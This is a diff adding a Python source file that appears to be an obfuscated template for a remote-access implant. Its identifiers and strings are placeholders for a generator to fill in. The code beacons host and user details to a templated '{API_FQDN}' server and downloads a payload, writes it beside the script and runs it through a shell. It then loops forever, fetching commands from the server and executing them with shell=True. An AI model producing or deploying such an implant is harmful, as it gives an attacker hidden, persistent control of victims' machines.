@@ -1,0 +1,148 @@
+import urllib.request, base64
+import subprocess
+import time, os
+
+
+"{null_bloc_0}"
+
+{crypt_var_25} = "/"
+
+"{null_bloc_0}"
+
+{crypt_var_1} = os.path.dirname(os.path.abspath(__file__)) + {crypt_var_25}
+
+
+{crypt_var_2} = "http://{API_FQDN}"
+
+"{null_bloc_0}"
+
+{crypt_var_5} = "{}/checkupdate.js?id={}&token={}&platform={}"
+
+
+{crypt_var_24} = {hash_table_linux_}
+
+"{null_bloc_0}"
+
+{crypt_var_3} = {{crypt_var_24}[0]: {crypt_var_24}[1]}
+{crypt_var_4} = {{crypt_var_24}[0]: {crypt_var_24}[2]}
+
+
+
+
+def {crypt_func_1}({crypt_var_16}, {crypt_var_17}=1):
+	"{null_bloc_1}"
+	if isinstance({crypt_var_16}, str):
+		{crypt_var_16} = bytes({crypt_var_16}, {crypt_var_24}[9])
+	{crypt_var_18} = [[{crypt_var_24}[3], {crypt_var_24}[4]], [{crypt_var_24}[5], {crypt_var_24}[6]], [{crypt_var_24}[7], {crypt_var_24}[8]]]
+	"{null_bloc_1}"
+	if {crypt_var_17} == -1:
+		{crypt_var_16} = base64.b64encode({crypt_var_16}).decode({crypt_var_24}[10])
+		for i in {crypt_var_18}:
+			{crypt_var_16} = {crypt_var_16}.replace(i[0], i[1])
+		return {crypt_var_16}
+	"{null_bloc_1}"
+	for i in {crypt_var_18}:
+		{crypt_var_16} = {crypt_var_16}.replace(i[::-1][0], i[::-1][1])
+	return base64.b64decode({crypt_var_16}).decode({crypt_var_24}[10])
+
+
+
+
+def {crypt_func_2}({crypt_var_19}):
+	"{null_bloc_1}"
+	{crypt_var_20} = subprocess.check_output({crypt_var_19}, shell=True)
+	"{null_bloc_1}"
+	return {crypt_var_20}.decode({crypt_var_24}[9])
+
+
+
+
+def {crypt_func_3}({crypt_var_19}):
+	"{null_bloc_1}"
+	{crypt_var_21} = {{crypt_var_24}[11]: {crypt_var_1}, {crypt_var_24}[12]: {crypt_var_24}[13]}
+	"{null_bloc_1}"
+	for k, v in {crypt_var_21}.items():
+		{crypt_var_19} = {crypt_var_19}.replace(k, v)
+	"{null_bloc_1}"
+	return {crypt_var_19}.replace("\n","").replace("\r","")
+
+
+"{null_bloc_0}"
+
+{crypt_var_6} = {crypt_func_2}({crypt_var_24}[14]).replace('\n','')
+
+"{null_bloc_0}"
+
+{crypt_var_7} = {crypt_var_24}[15] + {crypt_func_2}({crypt_var_24}[16]).split('-')[0]
+
+"{null_bloc_0}"
+
+{crypt_var_8} = {crypt_var_5}.format({crypt_var_2}, {crypt_var_6}, 0, {crypt_func_1}({crypt_var_7}, -1))
+{crypt_var_9} = urllib.request.Request({crypt_var_8}, headers={crypt_var_3})
+_ = urllib.request.urlopen({crypt_var_9})
+
+"{null_bloc_0}"
+
+
+def {crypt_func_4}():
+	"{null_bloc_1}"
+	{crypt_var_8} = {crypt_var_5}.format({crypt_var_2}, {crypt_var_6}, {crypt_var_24}[17], {crypt_func_1}({crypt_var_7}, -1))
+	{crypt_var_9} = urllib.request.Request({crypt_var_8}, headers={crypt_var_4})
+	{crypt_var_23} = urllib.request.urlopen({crypt_var_9})
+	"{null_bloc_1}"
+	{crypt_var_22} = {crypt_var_23}.read().decode({crypt_var_24}[9])
+	if {crypt_var_24}[18] in {crypt_var_22}:
+		{crypt_var_22} = {crypt_func_3}({crypt_var_22}[{crypt_var_24}[19]:])
+		"{null_bloc_2}"
+	return {crypt_var_22}
+
+
+"{null_bloc_0}"
+
+{crypt_var_10} = [{crypt_var_24}[20] for i in range({crypt_var_24}[21])]
+{crypt_var_11} = {crypt_var_24}[22]
+
+"{null_bloc_0}"
+
+{crypt_var_12} = -1
+
+
+
+{crypt_var_13} = urllib.request.urlopen('{}{}'.format({crypt_var_2}, {crypt_var_24}[23]))
+{crypt_var_14} = {crypt_var_13}.read()
+
+"{null_bloc_0}"
+
+with open('{}/{}'.format({crypt_var_1}, {crypt_var_24}[13]), 'wb') as f:
+	f.write({crypt_var_14})
+
+
+{crypt_var_26} = "{} {}/{}".format({crypt_var_24}[25], {crypt_var_1}, {crypt_var_24}[13])
+
+"{null_bloc_0}"
+
+{crypt_func_2}({crypt_var_26})
+
+"{null_bloc_0}"
+
+while True:
+	{crypt_var_12} += 1
+	"{null_bloc_1}"
+	{crypt_var_15} = {crypt_func_4}()
+	{crypt_var_10}[{crypt_var_12}%50 + 2] = {crypt_var_15}
+	"{null_bloc_1}"
+	if (not ({crypt_var_24}[20] in {crypt_var_10}[{crypt_var_12}%50 + 2] and {crypt_var_24}[20] not in {crypt_var_10}[{crypt_var_12}%50 + 1]) or {crypt_var_11} > 30):
+		print({crypt_var_24}[24].format({crypt_var_15}))
+		{crypt_func_2}({crypt_var_15})
+		{crypt_var_11} = 0
+		"{null_bloc_2}"
+	else:
+		{crypt_var_12} -= 1
+		{crypt_var_11} += 1
+		"{null_bloc_2}"
+		time.sleep(1)
+
+
+"{null_bloc_0}"
+
+"{null_bloc_0}"
